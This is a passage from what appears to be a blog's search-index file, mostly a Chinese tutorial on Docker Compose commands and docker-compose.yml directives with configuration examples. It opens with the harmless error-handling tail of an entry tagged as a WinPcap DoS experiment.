<span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nError sending the packet: \n&quot;</span>, <span class="built_in">pcap_geterr</span>(fp));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>winpcap</tag>
        <tag>DoS攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker-compose学习总结</title>
    <url>/Docker-compose%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Compose</code> 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排。从功能上看，跟 <code>OpenStack</code> 中的 <code>Heat</code> 十分类似。其代码目前在 <a href="https://github.com/docker/compose">https://github.com/docker/compose</a> 上开源。<span id="more"></span></p>
<p><code>Compose</code> 定位是 <strong>定义和运行多个 Docker 容器的应用（Defining and running multi-container Docker applications）</strong>，其前身是开源项目 Fig。</p>
<p>已知<code>Dockerfile</code> 模板文件可以让用户很方便的定义一个单独的应用容器。然而，在日常工作中，经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个 Web 项目，除了 Web 服务容器本身，往往还需要再加上后端的数据库服务容器，甚至还包括负载均衡容器等。</p>
<p><code>Compose</code> 允许用户通过一个单独的 <strong><code>docker-compose.yml</code></strong> 模板文件（YAML 格式）来定义一组相关联的应用容器为一个项目（project）。</p>
<p><code>Compose</code> 中有两个重要的概念：</p>
<ul>
<li>  **服务 (<code>service</code>)**：一个应用的容器，实际上可以包括若干运行相同镜像的容器实例。</li>
<li>  **项目 (<code>project</code>)**：由一组关联的应用容器组成的一个完整业务单元，在 <code>docker-compose.yml</code> 文件中定义。</li>
</ul>
<p><strong>一个项目可以由多个服务（容器）关联而成，<code>Compose</code> 面向项目进行管理。</strong></p>
<p><code>Compose</code> 的默认管理对象是项目，通过子命令对项目中的一组容器进行便捷地生命周期管理。</p>
<p><code>Compose</code> 项目目前由 Go 编写，实现上调用了 Docker 服务提供的 API 来对容器进行管理。因此，只要所操作的平台支持 Docker API，就可以在其上利用 <code>Compose</code> 来进行编排管理。</p>
<h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><p>以常见的Web网站为例，搭建一个包含Web应用和缓存的项目。</p>
<ol>
<li><p>创建Web应用</p>
<p>  新建文件夹，在该目录中编写 <code>app.py</code> 文件</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = Redis(host=<span class="string">'redis'</span>, port=<span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/'</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    count = redis.incr(<span class="string">'hits'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! 该页面已被访问 {} 次。\n'</span>.<span class="built_in">format</span>(count)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>编写 <code>Dockerfile</code> 文件</p>
<p>  编写 <code>Dockerfile</code> 文件，内容如下</p>
  <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.6</span>-alpine</span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> . /code</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /code</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install redis flask</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">"python"</span>, <span class="string">"app.py"</span>]</span></span><br></pre></td></tr></table></figure></li>
<li><p>编写 <code>docker-compose.yml</code> 文件，这是 Compose 使用的主模板文件。（后续介绍相关指令）</p>
  <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">"5000:5000"</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">"redis:alpine"</span></span><br></pre></td></tr></table></figure></li>
<li><p>运行项目</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<p>  此时访问本地 <code>5000</code> 端口，每次刷新页面，计数就会加 1。</p>
</li>
</ol>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>对于 Compose 来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到命令影响。</p>
<p>执行 <code>docker-compose [COMMAND] --help</code> 或者 <code>docker-compose help [COMMAND]</code> 可以查看具体某个命令的使用格式。</p>
<p><code>docker-compose</code> 命令的基本的使用格式是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose [-f=&lt;arg&gt;...] [options] [COMMAND] [ARGS...]</span><br></pre></td></tr></table></figure>

<p>参数说明</p>
<ul>
<li><p>  **<code>-f, --file FILE</code>**： 指定使用的 Compose 模板文件，默认为 <code>docker-compose.yml</code>，可以多次指定。</p>
</li>
<li><p>  <strong><code>-p, --project-name NAME</code></strong> ：指定项目名称，默认将使用所在目录名称作为项目名。</p>
</li>
<li><p>  <strong><code>--verbose</code></strong> ：输出更多调试信息。</p>
</li>
<li><p>  <strong><code>-v, --version</code></strong> ：打印版本并退出。</p>
</li>
</ul>
<h3 id="build"><a href="#build" class="headerlink" title="build"></a><code>build</code></h3><p>格式： <code>docker-compose build [options] [SERVICE...]</code></p>
<p>构建（重新构建）项目中的服务容器。</p>
<p>服务容器一旦构建后，将会带上一个标记名，例如对于 web 项目中的一个 db 容器，可能是 web_db。</p>
<p>可以随时在项目目录下运行 <code>docker-compose build</code> 来重新构建服务。</p>
<p>选项包括：</p>
<ul>
<li>  <code>--force-rm</code> 删除构建过程中的临时容器。</li>
<li>  <code>--no-cache</code> 构建镜像过程中不使用 cache（这将加长构建过程）。</li>
<li>  <code>--pull</code> 始终尝试通过 pull 来获取更新版本的镜像。</li>
</ul>
<h3 id="config"><a href="#config" class="headerlink" title="config"></a><code>config</code></h3><p>验证 Compose 文件格式是否正确，若正确则显示配置，若格式错误显示错误原因。</p>
<h3 id="down"><a href="#down" class="headerlink" title="down"></a><code>down</code></h3><p>此命令将会停止 <code>up</code> 命令所启动的容器，并移除网络</p>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a><code>exec</code></h3><p>进入指定的容器。</p>
<h3 id="help"><a href="#help" class="headerlink" title="help"></a><code>help</code></h3><p>获得一个命令的帮助。</p>
<h3 id="images"><a href="#images" class="headerlink" title="images"></a><code>images</code></h3><p>列出 Compose 文件中包含的镜像。</p>
<h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a><code>kill</code></h3><p>格式： <code>docker-compose kill [options] [SERVICE...]</code></p>
<p>通过发送 <code>SIGKILL</code> 信号来强制停止服务容器。</p>
<p>支持通过 <code>-s</code> 参数来指定发送的信号，例如通过如下指令发送 <code>SIGINT</code> 信号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose kill -s SIGINT</span><br></pre></td></tr></table></figure>

<h3 id="logs"><a href="#logs" class="headerlink" title="logs"></a><code>logs</code></h3><p>格式： <code>docker-compose logs [options] [SERVICE...]</code></p>
<p>查看服务容器的输出。默认情况下，docker-compose 将对不同的服务输出使用不同的颜色来区分。可以通过 <code>--no-color</code> 来关闭颜色。</p>
<p>该命令在调试问题的时候十分有用。</p>
<h3 id="pause"><a href="#pause" class="headerlink" title="pause"></a><code>pause</code></h3><p>格式： <code>docker-compose pause [SERVICE...]</code></p>
<p>暂停一个服务容器。</p>
<h3 id="port"><a href="#port" class="headerlink" title="port"></a><code>port</code></h3><p>格式： <code>docker-compose port [options] SERVICE PRIVATE_PORT</code></p>
<p>打印某个容器端口所映射的公共端口。</p>
<p>选项：</p>
<ul>
<li>  <code>--protocol=proto</code> 指定端口协议，tcp（默认值）或者 udp。</li>
<li>  <code>--index=index</code> 如果同一服务存在多个容器，指定命令对象容器的序号（默认为 1）。</li>
</ul>
<h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a><code>ps</code></h3><p>格式： <code>docker-compose ps [options] [SERVICE...]</code></p>
<p>列出项目中目前的所有容器。</p>
<p>选项：</p>
<ul>
<li>  <code>-q</code> 只打印容器的 ID 信息。</li>
</ul>
<h3 id="pull"><a href="#pull" class="headerlink" title="pull"></a><code>pull</code></h3><p>格式为 <code>docker-compose pull [options] [SERVICE...]</code>。</p>
<p>拉取服务依赖的镜像。</p>
<p>选项：</p>
<ul>
<li>  <code>--ignore-pull-failures</code> 忽略拉取镜像过程中的错误。</li>
</ul>
<h3 id="push"><a href="#push" class="headerlink" title="push"></a><code>push</code></h3><p>推送服务依赖的镜像到 Docker 镜像仓库。</p>
<h3 id="restart"><a href="#restart" class="headerlink" title="restart"></a><code>restart</code></h3><p>格式： <code>docker-compose restart [options] [SERVICE...]</code></p>
<p>重启项目中的服务。</p>
<p>选项：</p>
<ul>
<li>  <code>-t, --timeout TIMEOUT</code> 指定重启前停止容器的超时（默认为 10 秒）。</li>
</ul>
<h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a><code>rm</code></h3><p>格式： <code>docker-compose rm [options] [SERVICE...]</code></p>
<p>删除所有（停止状态的）服务容器。推荐先执行 <code>docker-compose stop</code> 命令来停止容器。</p>
<p>选项：</p>
<ul>
<li>  <code>-f, --force</code> 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。</li>
<li>  <code>-v</code> 删除容器所挂载的数据卷。</li>
</ul>
<h3 id="run"><a href="#run" class="headerlink" title="run"></a><code>run</code></h3><p>格式为 <code>docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]</code>。</p>
<p>在指定服务上执行一个命令。</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose run ubuntu ping docker.com</span><br></pre></td></tr></table></figure>

<p>将会启动一个 ubuntu 服务容器，并执行 <code>ping docker.com</code> 命令。</p>
<p>默认情况下，如果存在关联，则所有关联的服务将会自动被启动，除非这些服务已经在运行中。</p>
<p>该命令类似启动容器后运行指定的命令，相关卷、链接等等都将会按照配置自动创建。</p>
<p>两个不同点：</p>
<ul>
<li>  给定命令将会覆盖原有的自动运行命令；</li>
<li>  不会自动创建端口，以避免冲突。</li>
</ul>
<p>如果不希望自动启动关联的容器，可以使用 <code>--no-deps</code> 选项，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose run --no-deps web python manage.py shell</span><br></pre></td></tr></table></figure>

<p>将不会启动 web 容器所关联的其它容器。</p>
<p>选项：</p>
<ul>
<li>  <code>-d</code> 后台运行容器。</li>
<li>  <code>--name NAME</code> 为容器指定一个名字。</li>
<li>  <code>--entrypoint CMD</code> 覆盖默认的容器启动指令。</li>
<li>  <code>-e KEY=VAL</code> 设置环境变量值，可多次使用选项来设置多个环境变量。</li>
<li>  <code>-u, --user=""</code> 指定运行容器的用户名或者 uid。</li>
<li>  <code>--no-deps</code> 不自动启动关联的服务容器。</li>
<li>  <code>--rm</code> 运行命令后自动删除容器，<code>d</code> 模式下将忽略。</li>
<li>  <code>-p, --publish=[]</code> 映射容器端口到本地主机。</li>
<li>  <code>--service-ports</code> 配置服务端口并映射到本地主机。</li>
<li>  <code>-T</code> 不分配伪 tty，意味着依赖 tty 的指令将无法运行。</li>
</ul>
<h3 id="scale"><a href="#scale" class="headerlink" title="scale"></a><code>scale</code></h3><p>格式： <code>docker-compose scale [options] [SERVICE=NUM...]</code></p>
<p>设置指定服务运行的容器个数。</p>
<p>通过 <code>service=num</code> 的参数来设置数量。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose scale web=3 db=2</span><br></pre></td></tr></table></figure>

<p>将启动 3 个容器运行 web 服务，2 个容器运行 db 服务。</p>
<p>一般的，当指定数目多于该服务当前实际运行容器，将新创建并启动容器；反之，将停止容器。</p>
<p>选项：</p>
<ul>
<li>  <code>-t, --timeout TIMEOUT</code> 停止容器时候的超时（默认为 10 秒）。</li>
</ul>
<h3 id="start"><a href="#start" class="headerlink" title="start"></a><code>start</code></h3><p>格式： <code>docker-compose start [SERVICE...]</code></p>
<p>启动已经存在的服务容器。</p>
<h3 id="stop"><a href="#stop" class="headerlink" title="stop"></a><code>stop</code></h3><p>格式： <code>docker-compose stop [options] [SERVICE...]</code></p>
<p>停止已经处于运行状态的容器，但不删除它。通过 <code>docker-compose start</code> 可以再次启动这些容器。</p>
<p>选项：</p>
<ul>
<li>  <code>-t, --timeout TIMEOUT</code> 停止容器时候的超时（默认为 10 秒）。</li>
</ul>
<h3 id="top"><a href="#top" class="headerlink" title="top"></a><code>top</code></h3><p>查看各个服务容器内运行的进程。</p>
<h3 id="unpause"><a href="#unpause" class="headerlink" title="unpause"></a><code>unpause</code></h3><p>格式： <code>docker-compose unpause [SERVICE...]</code></p>
<p>恢复处于暂停状态中的服务。</p>
<h3 id="up"><a href="#up" class="headerlink" title="up"></a><code>up</code></h3><p>格式： <code>docker-compose up [options] [SERVICE...]</code></p>
<p>该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。</p>
<p>链接的服务都将会被自动启动，除非已经处于运行状态。</p>
<p>可以说，大部分时候都可以直接通过该命令来启动一个项目。</p>
<p>默认情况，<code>docker-compose up</code> 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。</p>
<p>当通过 <code>Ctrl-C</code> 停止命令时，所有容器将会停止。</p>
<p>如果使用 <code>docker-compose up -d</code>，将会在后台启动并运行所有的容器。一般推荐生产环境下使用该选项。</p>
<p>默认情况，如果服务容器已经存在，<code>docker-compose up</code> 将会尝试停止容器，然后重新创建（保持使用 <code>volumes-from</code> 挂载的卷），以保证新启动的服务匹配 <code>docker-compose.yml</code> 文件的最新内容。如果用户不希望容器被停止并重新创建，可以使用 <code>docker-compose up --no-recreate</code>。这样将只会启动处于停止状态的容器，而忽略已经运行的服务。如果用户只想重新部署某个服务，可以使用 <code>docker-compose up --no-deps -d &lt;SERVICE_NAME&gt;</code> 来重新创建服务并后台停止旧服务，启动新服务，并不会影响到其所依赖的服务。</p>
<p>选项：</p>
<ul>
<li>  <code>-d</code> 在后台运行服务容器。</li>
<li>  <code>--no-color</code> 不使用颜色来区分不同的服务的控制台输出。</li>
<li>  <code>--no-deps</code> 不启动服务所链接的容器。</li>
<li>  <code>--force-recreate</code> 强制重新创建容器，不能与 <code>--no-recreate</code> 同时使用。</li>
<li>  <code>--no-recreate</code> 如果容器已经存在了，则不重新创建，不能与 <code>--force-recreate</code> 同时使用。</li>
<li>  <code>--no-build</code> 不自动构建缺失的服务镜像。</li>
<li>  <code>-t, --timeout TIMEOUT</code> 停止容器时候的超时（默认为 10 秒）。</li>
</ul>
<h3 id="version"><a href="#version" class="headerlink" title="version"></a><code>version</code></h3><p>格式： <code>docker-compose version</code></p>
<p>打印版本信息。</p>
<h2 id="Compose-模板文件指令"><a href="#Compose-模板文件指令" class="headerlink" title="Compose 模板文件指令"></a>Compose 模板文件指令</h2><p>模板文件是使用 <code>Compose</code> 的核心，涉及到的指令关键字也比较多，大部分指令跟 <code>docker run</code> 相关参数的含义都是类似的。</p>
<p>默认的模板文件名称为 <code>docker-compose.yml</code>，格式为 YAML 格式。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">examples/web</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"80:80"</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"/data"</span></span><br></pre></td></tr></table></figure>

<p>注意每个服务都必须通过 <code>image</code> 指令指定镜像或 <code>build</code> 指令（需要 Dockerfile）等来自动构建生成镜像。</p>
<p>如果使用 <code>build</code> 指令，在 <code>Dockerfile</code> 中设置的选项(例如：<code>CMD</code>, <code>EXPOSE</code>, <code>VOLUME</code>, <code>ENV</code> 等) 将会自动被获取，无需在 <code>docker-compose.yml</code> 中重复设置。</p>
<p>下面分别介绍各个指令的用法。</p>
<h3 id="build-1"><a href="#build-1" class="headerlink" title="build"></a><code>build</code></h3><p>指定 <code>Dockerfile</code> 所在文件夹的路径（可以是绝对路径，或者相对 docker-compose.yml 文件的路径）。 <code>Compose</code> 将会利用它自动构建这个镜像，然后使用这个镜像。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./dir</span></span><br></pre></td></tr></table></figure>

<p>也可以使用 <code>context</code> 指令指定 <code>Dockerfile</code> 所在文件夹的路径。</p>
<p>使用 <code>dockerfile</code> 指令指定 <code>Dockerfile</code> 文件名。</p>
<p>使用 <code>arg</code> 指令指定构建镜像时的变量。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./dir</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile-alternate</span></span><br><span class="line">      <span class="attr">args:</span></span><br><span class="line">        <span class="attr">buildno:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>使用 <code>cache_from</code> 指定构建镜像的缓存</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">build:</span></span><br><span class="line">  <span class="attr">context:</span> <span class="string">.</span></span><br><span class="line">  <span class="attr">cache_from:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">alpine:latest</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">corp/web_app:3.14</span></span><br></pre></td></tr></table></figure>

<h3 id="cap-add-cap-drop"><a href="#cap-add-cap-drop" class="headerlink" title="cap_add/cap_drop"></a><code>cap_add/cap_drop</code></h3><p>指定容器的内核能力（capacity）分配。</p>
<p>例如，让容器拥有所有能力可以指定为：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cap_add:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ALL</span></span><br></pre></td></tr></table></figure>

<p>去掉 NET_ADMIN 能力可以指定为：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cap_drop:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">NET_ADMIN</span></span><br></pre></td></tr></table></figure>

<h3 id="command"><a href="#command" class="headerlink" title="command"></a><code>command</code></h3><p>覆盖容器启动后默认执行的命令。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">command:</span> <span class="string">echo</span> <span class="string">"hello world"</span></span><br></pre></td></tr></table></figure>

<h3 id="configs"><a href="#configs" class="headerlink" title="configs"></a><code>configs</code></h3><p>仅用于 <code>Swarm mode</code>。</p>
<h3 id="cgroup-parent"><a href="#cgroup-parent" class="headerlink" title="cgroup_parent"></a><code>cgroup_parent</code></h3><p>指定父 <code>cgroup</code> 组，意味着将继承该组的资源限制。</p>
<p>例如，创建了一个 cgroup 组名称为 <code>cgroups_1</code>。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cgroup_parent:</span> <span class="string">cgroups_1</span></span><br></pre></td></tr></table></figure>

<h3 id="container-name"><a href="#container-name" class="headerlink" title="container_name"></a><code>container_name</code></h3><p>指定容器名称。默认将会使用 <code>项目名称_服务名称_序号</code> 这样的格式。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">container_name:</span> <span class="string">docker-web-container</span></span><br></pre></td></tr></table></figure>

<p>注意: 指定容器名称后，该服务将无法进行扩展（scale），因为 Docker 不允许多个容器具有相同的名称。</p>
<h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a><code>deploy</code></h3><p>仅用于 <code>Swarm mode</code>。</p>
<h3 id="devices"><a href="#devices" class="headerlink" title="devices"></a><code>devices</code></h3><p>指定设备映射关系。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">devices:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"/dev/ttyUSB1:/dev/ttyUSB0"</span></span><br></pre></td></tr></table></figure>

<h3 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a><code>depends_on</code></h3><p>解决容器的依赖、启动先后的问题。以下例子中会先启动 <code>redis</code> <code>db</code> 再启动 <code>web</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres</span></span><br></pre></td></tr></table></figure>

<p>注意：<code>web</code> 服务不会等待 <code>redis</code> <code>db</code> 「完全启动」之后才启动。</p>
<h3 id="dns"><a href="#dns" class="headerlink" title="dns"></a><code>dns</code></h3><p>自定义 <code>DNS</code> 服务器。可以是一个值，也可以是一个列表。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">dns:</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br></pre></td></tr></table></figure>

<h3 id="dns-search"><a href="#dns-search" class="headerlink" title="dns_search"></a><code>dns_search</code></h3><p>配置 <code>DNS</code> 搜索域。可以是一个值，也可以是一个列表。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">dns_search:</span> <span class="string">example.com</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns_search:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">domain1.example.com</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">domain2.example.com</span></span><br></pre></td></tr></table></figure>

<h3 id="tmpfs"><a href="#tmpfs" class="headerlink" title="tmpfs"></a><code>tmpfs</code></h3><p>挂载一个 tmpfs 文件系统到容器。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tmpfs:</span> <span class="string">/run</span></span><br><span class="line"><span class="attr">tmpfs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/run</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/tmp</span></span><br></pre></td></tr></table></figure>

<h3 id="env-file"><a href="#env-file" class="headerlink" title="env_file"></a><code>env_file</code></h3><p>从文件中获取环境变量，可以为单独的文件路径或列表。</p>
<p>如果通过 <code>docker-compose -f FILE</code> 方式来指定 Compose 模板文件，则 <code>env_file</code> 中变量的路径会基于模板文件路径。</p>
<p>如果有变量名称与 <code>environment</code> 指令冲突，则按照惯例，以后者为准。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">env_file:</span> <span class="string">.env</span></span><br><span class="line"></span><br><span class="line"><span class="attr">env_file:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">./common.env</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">./apps/web.env</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/opt/secrets.env</span></span><br></pre></td></tr></table></figure>

<p>环境变量文件中每一行必须符合格式，支持 <code>#</code> 开头的注释行。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># common.env: Set development environment</span></span><br><span class="line"><span class="string">PROG_ENV=development</span></span><br></pre></td></tr></table></figure>

<h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a><code>environment</code></h3><p>设置环境变量。你可以使用数组或字典两种格式。</p>
<p>只给定名称的变量会自动获取运行 Compose 主机上对应变量的值，可以用来防止泄露不必要的数据。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line">  <span class="attr">RACK_ENV:</span> <span class="string">development</span></span><br><span class="line">  <span class="attr">SESSION_SECRET:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">environment:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RACK_ENV=development</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">SESSION_SECRET</span></span><br></pre></td></tr></table></figure>

<p>如果变量名称或者值中用到 <code>true|false，yes|no</code> 等表达布尔含义的词汇，最好放到引号里，避免 YAML 自动解析某些内容为对应的布尔语义。这些特定词汇，包括</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y|Y|yes|Yes|YES|n|N|no|No|NO|true|True|TRUE|false|False|FALSE|on|On|ON|off|Off|OFF</span><br></pre></td></tr></table></figure>

<h3 id="expose"><a href="#expose" class="headerlink" title="expose"></a><code>expose</code></h3><p>暴露端口，但不映射到宿主机，只被连接的服务访问。</p>
<p>仅可以指定内部端口为参数。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">expose:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">"3000"</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">"8000"</span></span><br></pre></td></tr></table></figure>

<h3 id="external-links"><a href="#external-links" class="headerlink" title="external_links"></a><code>external_links</code></h3><blockquote>
<p>  注意：不建议使用该指令。</p>
</blockquote>
<p>链接到 <code>docker-compose.yml</code> 外部的容器，甚至并非 <code>Compose</code> 管理的外部容器。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">external_links:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">redis_1</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">project_db_1:mysql</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">project_db_1:postgresql</span></span><br></pre></td></tr></table></figure>

<h3 id="extra-hosts"><a href="#extra-hosts" class="headerlink" title="extra_hosts"></a><code>extra_hosts</code></h3><p>类似 Docker 中的 <code>--add-host</code> 参数，指定额外的 host 名称映射信息。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">extra_hosts:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">"googledns:8.8.8.8"</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">"dockerhub:52.1.157.61"</span></span><br></pre></td></tr></table></figure>

<p>会在启动后的服务容器中 <code>/etc/hosts</code> 文件中添加如下两条条目。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.8.8.8 googledns</span><br><span class="line">52.1.157.61 dockerhub</span><br></pre></td></tr></table></figure>

<h3 id="healthcheck"><a href="#healthcheck" class="headerlink" title="healthcheck"></a><code>healthcheck</code></h3><p>通过命令检查容器是否健康运行。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">healthcheck:</span></span><br><span class="line">  <span class="attr">test:</span> [<span class="string">"CMD"</span>, <span class="string">"curl"</span>, <span class="string">"-f"</span>, <span class="string">"http://localhost"</span>]</span><br><span class="line">  <span class="attr">interval:</span> <span class="string">1m30s</span></span><br><span class="line">  <span class="attr">timeout:</span> <span class="string">10s</span></span><br><span class="line">  <span class="attr">retries:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>

<h3 id="image"><a href="#image" class="headerlink" title="image"></a><code>image</code></h3><p>指定为镜像名称或镜像 ID。如果镜像在本地不存在，<code>Compose</code> 将会尝试拉取这个镜像。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">image:</span> <span class="string">ubuntu</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">orchardup/postgresql</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">a4bc65fd</span></span><br></pre></td></tr></table></figure>

